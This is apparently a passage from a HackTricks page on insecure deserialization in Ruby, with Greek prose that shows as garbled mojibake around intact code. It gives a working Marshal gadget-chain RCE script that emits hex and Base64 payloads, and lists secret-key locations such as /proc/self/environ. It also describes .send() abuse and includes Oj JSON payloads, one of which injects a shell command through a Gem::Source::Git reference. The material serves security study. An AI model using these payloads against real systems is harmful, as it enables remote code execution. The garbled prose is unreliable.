Î´Î¹Î±Ï†Î¬Î½ÎµÎ¹ÎµÏ‚: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Î£Ï„Î·Î½ Ruby, Î· Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î´ÏÎ¿ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· **marshal**. Î— Ï€ÏÏÏ„Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚, Î³Î½Ï‰ÏƒÏ„Î® Ï‰Ï‚ **dump**, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Î¼ÎµÏ„Î±Ï„ÏÎ­ÏˆÎµÎ¹ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ ÏƒÎµ ÏÎ¿Î® byte. Î‘Ï…Ï„Î® Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ Ï‰Ï‚ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·. Î‘Î½Ï„Î¯Î¸ÎµÏ„Î±, Î· Î´ÎµÏÏ„ÎµÏÎ· Î¼Î­Î¸Î¿Î´Î¿Ï‚, **load**, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± ÎµÏ€Î±Î½Î±Ï†Î­ÏÎµÎ¹ Î¼Î¹Î± ÏÎ¿Î® byte Ï€Î¯ÏƒÏ‰ ÏƒÎµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿, Î¼Î¹Î± Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·.

Î“Î¹Î± Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± Ï„Ï‰Î½ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Ï‰Î½ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½, **Î· Ruby Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ HMAC (Hash-Based Message Authentication Code)**, Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±ÎºÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î± ÎºÎ±Î¹ Ï„Î·Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÏŒÏ„Î·Ï„Î± Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½. Î¤Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎºÎ¿Ï€ÏŒ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÏƒÎµ Î¼Î¯Î± Î±Ï€ÏŒ Ï€Î¿Î»Î»Î­Ï‚ Ï€Î¹Î¸Î±Î½Î­Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯ÎµÏ‚:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X Î³ÎµÎ½Î¹ÎºÎ® Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÏƒÎµ Î±Î»Ï…ÏƒÎ¯Î´Î± gadget RCE (Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ„Î¿** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Î†Î»Î»ÎµÏ‚ Î±Î»Ï…ÏƒÎ¯Î´ÎµÏ‚ RCE Î³Î¹Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î¿Ï… Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### ÎœÎ­Î¸Î¿Î´Î¿Ï‚ Ruby .send()

ÎŒÏ€Ï‰Ï‚ ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ [**Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î±Ï†Î¿ÏÎ¬ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), Î±Î½ ÎºÎ¬Ï€Î¿Î¹Î± Î¼Î· Ï†Î¹Î»Ï„ÏÎ±ÏÎ¹ÏƒÎ¼Î­Î½Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î· Ï†Ï„Î¬ÏƒÎµÎ¹ ÏƒÏ„Î· Î¼Î­Î¸Î¿Î´Î¿ `.send()` ÎµÎ½ÏŒÏ‚ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… ruby, Î±Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î· Î¼Î­Î¸Î¿Î´Î¿** Ï„Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î¼Îµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚.

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î· ÎºÎ»Î®ÏƒÎ· eval ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎºÏÎ´Î¹ÎºÎ± ruby Ï‰Ï‚ Î´ÎµÏÏ„ÎµÏÎ· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ Î¸Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Î½ Î¼ÏŒÎ½Î¿ Î¼Î¯Î± Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ Ï„Î·Ï‚ **`.send()`** ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿, ÏŒÏ€Ï‰Ï‚ Î±Î½Î±Ï†Î­ÏÎ¸Î·ÎºÎµ ÏƒÏ„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Ï€ÎµÏÎ¹Î³ÏÎ±Ï†Î®, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎºÎ»Î·Î¸ÎµÎ¯ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î¼Î­Î¸Î¿Î´Î¿Ï‚ Ï„Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Ï€Î¿Ï… **Î´ÎµÎ½ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚** Î® Ï„Ï‰Î½ Î¿Ï€Î¿Î¯Ï‰Î½ Î¿Î¹ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹ Î­Ï‡Î¿Ï…Î½ **Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚**.\
Î“Î¹Î± Î±Ï…Ï„ÏŒ, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î±Ï€Î±ÏÎ¹Î¸Î¼Î·Î¸Î¿ÏÎ½ ÏŒÎ»ÎµÏ‚ Î¿Î¹ Î¼Î­Î¸Î¿Î´Î¿Î¹ Ï„Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î³Î¹Î± Î½Î± **Î²ÏÎµÎ¸Î¿ÏÎ½ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎµÏ‚ Î¼Î­Î¸Î¿Î´Î¿Î¹ Ï€Î¿Ï… Ï€Î»Î·ÏÎ¿ÏÎ½ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î±Ï€Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

### Î†Î»Î»ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚

Î‘Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÎµÎ»Î®Ï†Î¸Î·[ **Î±Ï€ÏŒ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ· ÏƒÏ„Î¿ blog**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared).

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î¬Î»Î»ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ Ruby Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Ï„Î·Î½ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½ ÎºÎ±Î¹ ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„Î¿ÏÎ½ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î½ RCE ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Î¼Î¹Î±Ï‚ Î±Î½Î±ÏƒÏ†Î±Î»Î¿ÏÏ‚ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚. ÎŸ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î¯Î½Î±ÎºÎ±Ï‚ Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ ÎºÎ±Î¹ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ Ï€Î¿Ï… ÎºÎ±Î»Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î· Ï†Î¿ÏÏ„Ï‰Î¼Î­Î½Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· ÏŒÏ€Î¿Ï„Îµ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ (Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï€ÏÎ¿Ï‚ ÎºÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ RCE Î²Î±ÏƒÎ¹ÎºÎ¬):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Î’Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·</strong></td><td><strong>Î”ÎµÎ´Î¿Î¼Î­Î½Î± ÎµÎ¹ÏƒÏŒÎ´Î¿Ï…</strong></td><td><strong>ÎœÎ­Î¸Î¿Î´Î¿Ï‚ ÎµÎºÎºÎ¯Î½Î·ÏƒÎ·Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ ÎºÎ»Î¬ÏƒÎ·</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Î”Ï…Î±Î´Î¹ÎºÎ¬</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (Î· ÎºÎ»Î¬ÏƒÎ· Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î·Î¸ÎµÎ¯ ÏƒÎµ hash(map) Ï‰Ï‚ ÎºÎ»ÎµÎ¹Î´Î¯)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (Î· ÎºÎ»Î¬ÏƒÎ· Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î·Î¸ÎµÎ¯ ÏƒÎµ hash(map) Ï‰Ï‚ ÎºÎ»ÎµÎ¹Î´Î¯)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (Î· ÎºÎ»Î¬ÏƒÎ· Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î·Î¸ÎµÎ¯ ÏƒÎµ hash(map) Ï‰Ï‚ ÎºÎ»ÎµÎ¹Î´Î¯)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([Î´ÎµÎ¯Ï„Îµ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÎµÎ¹Ï‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ json_create ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚](#table-vulnerable-sinks))</td></tr></tbody></table>

Î’Î±ÏƒÎ¹ÎºÏŒ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Î£Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎ±Î¼Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ Ï„Î¿ Oj, Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Î¼Î¹Î± ÎºÎ»Î¬ÏƒÎ· gadget Ï€Î¿Ï… Î¼Î­ÏƒÎ± ÏƒÏ„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `hash` Ï„Î·Ï‚ Î¸Î± ÎºÎ±Î»Î¿ÏÏƒÎµ Ï„Î¿ `to_s`, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¸Î± ÎºÎ±Î»Î¿ÏÏƒÎµ Ï„Î¿ spec, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¸Î± ÎºÎ±Î»Î¿ÏÏƒÎµ Ï„Î¿ fetch\_path, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Ï„Î¿ ÎºÎ¬Î½Î¿Ï…Î¼Îµ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÎ¹ Î¼Î¹Î± Ï„Ï…Ï‡Î±Î¯Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î­Î½Î±Î½ ÎµÎ¾Î±Î¹ÏÎµÏ„Î¹ÎºÏŒ Î±Î½Î¹Ï‡Î½ÎµÏ…Ï„Î® Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… ÎµÎ¯Î´Î¿Ï…Ï‚ Ï„Ï‰Î½ Î¼Î· ÎºÎ±Î¸Î±ÏÎ¹ÏƒÎ¼Î­Î½Ï‰Î½ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·Ï‚.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport","path": "/", "user": "anyuser", "password": "anypw"
}
```
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î´Î¹Î±Ï€Î¹ÏƒÏ„ÏÎ¸Î·ÎºÎµ ÏŒÏ„Î¹ Î¼Îµ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î­Î½Î±Ï‚ Ï†Î¬ÎºÎµÎ»Î¿Ï‚ ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î±, Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿Ï‚ Î³Î¹Î± Ï„Î·Î½ ÎºÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Î¼Î¹Î±Ï‚ Î¬Î»Î»Î·Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î®Ï‚ Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î¼ÎµÏ„Î±Ï„ÏÎ±Ï€ÎµÎ¯ Î±Ï…Ï„ÏŒ ÏƒÎµ Ï€Î»Î®ÏÎ· RCE Î¼Îµ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Î•Î»Î­Î³Î¾Ï„Îµ Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏƒÏ„Î·Î½ [**Ï€ÏÏ‰Ï„ÏŒÏ„Ï…Ï€Î· Î±Î½Î¬ÏÏ„Î·ÏƒÎ·**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared).

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
